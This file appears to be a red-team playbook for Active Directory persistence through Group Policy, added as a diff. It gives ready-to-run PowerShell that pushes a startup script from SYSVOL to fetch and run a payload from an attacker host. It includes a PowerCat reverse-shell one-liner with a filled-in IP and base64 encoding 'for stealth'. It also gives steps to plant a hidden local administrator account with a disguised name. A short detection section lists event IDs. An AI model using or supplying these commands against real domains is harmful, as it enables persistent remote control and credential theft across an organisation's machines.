@@ -1,0 +1,182 @@
+Technique #1: Startup Script Injection via GPO
+🎯 Goal:
+
+Abuse Group Policy to run a script every time a computer starts or a user logs on, giving you persistent execution without touching disk manually on each machine.
+🧱 GPO Startup vs Logon Scripts: What’s the Difference?
+Type	Applies To	Triggers When	GPO Path
+Startup	Computer	On boot (before user login)	Computer Configuration > Policies > Windows Settings > Scripts (Startup/Shutdown)
+Logon	User	When user logs on	User Configuration > Policies > Windows Settings > Scripts (Logon/Logoff)
+
+You can use either, depending on access and objective.
+🔧 Prerequisites
+
+    ✅ Domain Admin or delegated GPO editing rights
+
+    ✅ Access to SYSVOL (\domain\SYSVOL\domain.local...)
+\\domain.local\SYSVOL\domain.local\scripts\payload.ps1
+
+    ✅ A script (e.g., payload.ps1, backdoor.vbs, reverse.exe, etc.)
+
+🚀 Step-by-Step: Inject a Startup Script via GPO
+Step 1: Choose or Create a GPO
+
+Use an existing GPO that targets your victims, or create a new one:
+
+New-GPO -Name "StartupPersistence"
+
+Link it to an OU with your targets:
+
+New-GPLink -Name "StartupPersistence" -Target "OU=Workstations,DC=domain,DC=local"
+
+Step 2: Drop Your Payload into SYSVOL
+
+Example PowerShell reverse shell script:
+
+echo 'Invoke-WebRequest -Uri http://attacker-ip/shell.ps1 -OutFile C:\Temp\shell.ps1; powershell -ExecutionPolicy Bypass -File C:\Temp\shell.ps1' > payload.ps1
+
+Copy it into SYSVOL:
+
+\\domain.local\SYSVOL\domain.local\scripts\payload.ps1
+
+This ensures every domain-joined computer can access it.
+Step 3: Configure the GPO to Run the Script
+
+Open Group Policy Management Editor, go to:
+
+Computer Configuration →
+Policies →
+Windows Settings →
+Scripts (Startup/Shutdown) →
+Startup →
+Add...
+
+    Script Name: \\domain.local\SYSVOL\domain.local\scripts\payload.ps1
+
+If GUI isn’t an option, you can automate with PowerShell:
+
+Set-GPStartupScript -Name "StartupPersistence" -ScriptPath "\\domain.local\SYSVOL\domain.local\scripts\payload.ps1"
+
+Step 4: Force GPO Update (Optional)
+
+To test it immediately on a target:
+
+gpupdate /force
+
+Or reboot the machine — script will execute on next boot.
+✅ Result
+
+Every machine in the affected OU will execute your script at boot. Depending on what it does, you can:
+
+    Reinfect systems
+
+    Maintain C2
+
+    Create new users
+
+    Harvest creds
+
+🕵️‍♂️ Detection
+
+Blue teams may catch this via:
+
+    Changes to gpt.ini or scripts.ini in SYSVOL
+
+    Windows Event ID 4688 (script execution)
+
+    GPO modification logs: Event ID 4739
+
+PAYLOAD
+  Payload (PowerCat Reverse Shell)
+
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');
+powercat -c YOUR-IP -p 4444 -e cmd
+
+    🔁 Replace YOUR-IP with your attack box’s IP address.
+
+✅ Example (Ready-to-Inject)
+
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.100 -p 4444 -e cmd
+
+
+Optional Base64 Encoding (For stealth or -EncodedCommand)
+
+$command = "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.100 -p 4444 -e cmd"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+[Convert]::ToBase64String($bytes)
+
+Then run it via GPO script:
+
+powershell.exe -WindowStyle Hidden -EncodedCommand <BASE64_STRING>
+
+-----------------------------------------------------------------------------------
+
+Step-by-Step: Inject a Malicious Local Admin User via GPO
+✅ Step 1: Create or Select a GPO
+
+    Open Group Policy Management (gpmc.msc)
+
+    Right-click on the OU you want to target → Create a GPO in this domain
+
+        Name it something low-profile like Workstation Maintenance
+
+    Right-click the GPO → Edit
+
+🔹 Step 2: Navigate to Local User Settings
+
+In the Group Policy Editor:
+
+Computer Configuration → Preferences → Control Panel Settings → Local Users and Groups
+
+    Right-click → New → Local User
+
+    Configure the following:
+
+        Action: Create
+
+        User name: sysback (or another low-profile name)
+
+        Full name: Something like System Backup Service
+
+        Description: System managed user
+
+        Password: Choose a strong one (can be passed via GPP or added later with your tool)
+
+        ✅ Check: Password never expires
+
+        ✅ Check: User cannot change password
+
+        ✅ Check: Account never expires
+
+🔹 Step 3: Add the User to the Local Administrators Group
+
+In the same GPO:
+
+    Right-click on Local Users and Groups → New → Local Group
+
+    Choose:
+
+        Group name: Administrators (built-in)
+
+        Action: Update
+
+    Under Members:
+
+        Click Add...
+
+        Type the name of your user account (e.g., sysback)
+
+🔹 Step 4: Apply and Link GPO to Target Systems
+
+    Make sure the GPO is linked to the correct OU
+
+    Run gpupdate /force on a test system or just reboot a domain-joined machine in that OU
+
+✅ Result
+
+Now, every machine within the scope of the GPO will:
+
+    Have a new local admin user silently created
+
+    The user will persist through reboots
+
+    It can be used with psexec, wmiexec, rdp, etc.
